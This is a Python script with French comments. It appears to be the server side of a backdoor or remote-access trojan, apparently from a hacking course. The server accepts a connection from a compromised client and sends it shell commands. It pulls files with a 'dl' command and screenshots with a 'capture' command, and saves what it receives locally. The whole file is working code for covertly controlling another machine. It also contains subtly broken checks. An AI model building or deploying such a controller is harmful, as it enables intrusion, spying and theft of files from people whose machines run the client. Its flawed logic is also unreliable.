# SOCKETS RÉSEAU : SERVEUR
#
# socket
#   bind (ip, port)  127.0.0.1 -> localhost
#   listen
#   accept -> socket / (ip, port)
#   close

# already used

import socket
# Configuration constants
HOST_IP = "10.0.2.15"   # Server's IP address
HOST_PORT = 32000       # Port for communication
MAX_DATA_SIZE = 1024    # Maximum size of data to receive at once

# Create a socket object
s = socket.socket()

# Set socket options to reuse the address if it's in a TIME_WAIT state
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

# Bind the socket to the specified IP address and port
s.bind((HOST_IP, HOST_PORT))

# Listen for incoming connections
s.listen()

# Function to receive all data from a socket until the specified length
def sockets_receive_all_data(socket_p, data_len):
    current_data_len = 0
    total_data = None
    while current_data_len < data_len:
        chunk_len = data_len - current_data_len
        if chunk_len > MAX_DATA_SIZE:
            chunk_len = MAX_DATA_SIZE
        data = socket_p.recv(chunk_len)
        if not data:
            return None
        if not total_data:
            total_data = data
        else:
            total_data += data
        current_data_len += len(data)
    return total_data

# Print server status
print(f"Waiting for connection on {HOST_IP}, port {HOST_PORT}...")
# Accept incoming connection
connection_socket, client_address = s.accept()
print(f"Connection established with {client_address}")

# Function to send a command and receive all data from the socket
def sockets_send_and_receive_all_data(socket_p, command):
    if not command:
        return None
    socket_p.sendall(command.encode())

    # Receive the header containing the length of data
    header = sockets_receive_all_data(socket_p, 13)
    data_length = int(header.decode())

    # Receive all data based on the length received in the header
    data_received = sockets_receive_all_data(socket_p, data_length)

    return data_received

# Initialize variable for file name
file_name = None

# Main loop to interact with the client
while True:
    # Send "infos" command to get initial information from client
    info = sockets_send_and_receive_all_data(connection_socket, "infos")

    # Prompt for user input to send commands to client
    command = input(f"{client_address[0]}:{client_address[1]} {info.decode()} > ")
    command_split = command.split(" ")

    # Exit loop if no information is received from the client
    if not info:
        break

    # Send user command to client and receive response
    data_received = sockets_send_and_receive_all_data(connection_socket, command)

    # Handle file download command
    if len(command_split) == 2 and command_split[0] == "dl":
        file_name = command_split[1]

    # Handle screen capture command
    if len(command_split) == 2 and command_split[0] == "capture":
        file_name = command_split[1] + (".png")

    # Exit loop if no data received from client
    if not data_received:
        break

    # If file name is specified, handle file transfer
    if file_name:
        # Check if the received data indicates the file doesn't exist
        if len(data_received) == 1 and data_received == b"":
            print(f"ERROR: File {file_name} does not exist on client")
        else:
            # Write received data to file
            with open(file_name, "wb") as f:
                f.write(data_received)
            print(f"File {file_name} downloaded")
        file_name = None
    else:
        # Print received data from client
        print(data_received.decode())

# Close server socket and connection socket
s.close()
connection_socket.close()
